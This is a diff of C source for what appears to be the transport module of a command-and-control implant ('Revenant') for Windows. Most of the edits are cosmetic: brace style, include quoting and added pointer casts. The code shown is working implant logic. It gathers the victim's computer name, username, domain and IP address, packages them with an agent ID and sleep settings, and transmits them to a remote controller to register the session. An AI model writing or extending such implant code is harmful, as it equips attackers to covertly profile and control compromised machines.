@@ -1,21 +1,20 @@
-#include <Revnt.h>
-
-#include <Transport.h>
-#include <Command.h>
-#include <Core.h>
+#include "Revenant.h"
+#include "Transport.h"
+#include "Command.h"
+#include "Core.h"
 
 #include <iptypes.h>
 #include <iphlpapi.h>
 #include <winternl.h>
 #include <winhttp.h>
+#include <stdio.h>
 
 #define DATA_FREE( d, l ) \
     memset( d, 0, l ); \
     LocalFree( d ); \
     d = NULL;
 
-BOOL TransportInit( )
-{
+BOOL TransportInit( ) {
     PPACKAGE         Package    = NULL;
     BOOL             Success    = FALSE;
     PVOID            Data       = NULL;
@@ -53,10 +52,9 @@ BOOL TransportInit( )
     PackageAddInt32( Package, Instance.Session.AgentID );
 
     // Get Computer name
-    if ( ! GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
-    {
+    if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
+            GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
@@ -64,25 +62,22 @@ BOOL TransportInit( )
     // Get Username
     Length = MAX_PATH;
     if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-        GetUserNameA( Data, &Length );
+        GetUserNameA(Data, (LPDWORD) &Length);
 
     PackageAddBytes( Package, Data, strlen( Data ) );
     DATA_FREE( Data, Length );
 
     // Get Domain
-    if ( ! GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
-    {
+    if ( ! GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
-            GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
+            GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
     }
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
 
-    GetAdaptersInfo( NULL, &Length );
-    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) )
-    {
-        if ( GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
-        {
+    GetAdaptersInfo(NULL, (PULONG) &Length);
+    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
+        if (GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
             PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
 
             memset( Adapter, 0, Length );
@@ -122,21 +117,17 @@ BOOL TransportInit( )
     PackageAddInt32( Package, Instance.Config.Sleeping );
     // End of Options
 
-    if ( PackageTransmit( Package, &Data, &Length ) )
-    {
-        PRINT_HEX( Data, Length )
+    if ( PackageTransmit( Package, &Data, &Length ) ){
+        PRINT_HEX( Data, (int)Length )
 
-        if ( Data )
-        {
+        if ( Data ){
             _tprintf( "Agent => %x : %x\n", ( UINT32 ) DEREF( Data ), ( UINT32 ) Instance.Session.AgentID );
-            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
-            {
+            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) ){
                 Instance.Session.Connected = TRUE;
                 Success = TRUE;
             }
         }
-        else
-        {
+        else {
             Success = FALSE;
         }
     }
@@ -144,8 +135,7 @@ BOOL TransportInit( )
     return Success;
 }
 
-BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
-{
+BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize ) {
     HANDLE  hConnect        = NULL;
     HANDLE  hSession        = NULL;
     HANDLE  hRequest        = NULL;
